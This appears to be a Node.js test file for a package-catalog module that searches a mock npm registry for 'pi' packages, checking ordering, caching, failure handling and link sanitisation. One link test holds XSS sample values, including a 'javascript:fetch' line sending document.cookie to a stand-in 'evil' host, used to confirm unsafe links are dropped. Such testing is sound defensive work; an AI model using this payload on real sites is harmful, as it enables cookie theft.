import test from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";

const hits = [];
const registry = createServer((req, res) => {
  hits.push(req.url);
  const text = new URL(req.url, "http://x").searchParams.get("text") ?? "";
  const pkg = (name, keywords, weekly, description = "") => ({ downloads: { weekly }, package: { name, version: "1.0.0", description, keywords, date: "2026-09-01T00:00:00Z", publisher: { username: "someone" }, links: { npm: `https://www.npmjs.com/package/${name}` } } });
  res.setHeader("content-type", "application/json");
  if (text.includes("broken")) { res.statusCode = 500; return res.end("{}"); }
  res.end(JSON.stringify({ objects: [
    pkg("pi-small", ["pi-package"], 10),
    pkg("pi-big", ["pi-package", "extension"], 5000),
    pkg("pi-litellm", ["pi-package", "provider"], 300, "LiteLLM proxy provider"),
    pkg("not-pi", ["provider"], 99999),
  ] }));
});
await new Promise((r) => registry.listen(0, "127.0.0.1", r));
process.env.NPM_REGISTRY_URL = `http://127.0.0.1:${registry.address().port}`;
const { searchCatalog, toPackage } = await import("../dist/catalog.js");
test.after(() => registry.close());

test("only real pi packages are listed, the most used first", async () => {
  const list = await searchCatalog("");
  assert.deepEqual(list.map((p) => p.name), ["pi-big", "pi-litellm", "pi-small"]);
  assert.equal(list[0].weekly, 5000);
  assert.equal(list[0].author, "someone");
  assert.match(hits.at(-1), /keywords%3Api-package/);
});

test("the provider topic keeps packages that bring models, and a search keeps npm's order", async () => {
  assert.deepEqual((await searchCatalog("", "provider")).map((p) => p.name), ["pi-litellm"]);
  assert.deepEqual((await searchCatalog("proxy")).map((p) => p.name), ["pi-small", "pi-big", "pi-litellm"]);
});

test("an answer is kept a while, and a failure is not", async () => {
  const before = hits.length;
  await searchCatalog("");
  assert.equal(hits.length, before, "asked again from what was kept");
  await assert.rejects(searchCatalog("broken"), /Could not reach the package list \(npm answered 500\.\)/);
  await assert.rejects(searchCatalog("broken"));
  assert.equal(hits.length, before + 2, "a failure is asked again");
});

test("a result without a name or version is left out", () => {
  assert.equal(toPackage({ package: { name: "x" } }), undefined);
  assert.equal(toPackage({ package: { name: "x", version: "1", keywords: ["pi-package", "LLM-Provider"] } }).provider, true);
});

test("a package's link is kept only when it goes to a web page", () => {
  const one = (links) => toPackage({ package: { name: "pi-x", version: "1.0.0", keywords: ["pi-package"], links } });
  assert.equal(one({ homepage: "javascript:fetch('//evil/'+document.cookie)" }).homepage, undefined);
  assert.equal(one({ homepage: "javascript:alert(1)", repository: "https://github.com/a/b" }).homepage, "https://github.com/a/b");
  assert.equal(one({ npm: "data:text/html,<script>1</script>" }).npm, undefined);
  assert.equal(one({ homepage: "https://pi.dev/x" }).homepage, "https://pi.dev/x");
});

test("searches kept are only so many: each word typed is one", async () => {
  const { KEEP_MAX, keptSearches } = await import("../dist/catalog.js");
  for (let i = 0; i < KEEP_MAX + 30; i++) await searchCatalog(`word ${i}`);
  assert.ok(keptSearches() <= KEEP_MAX, `${keptSearches()} kept`);
});
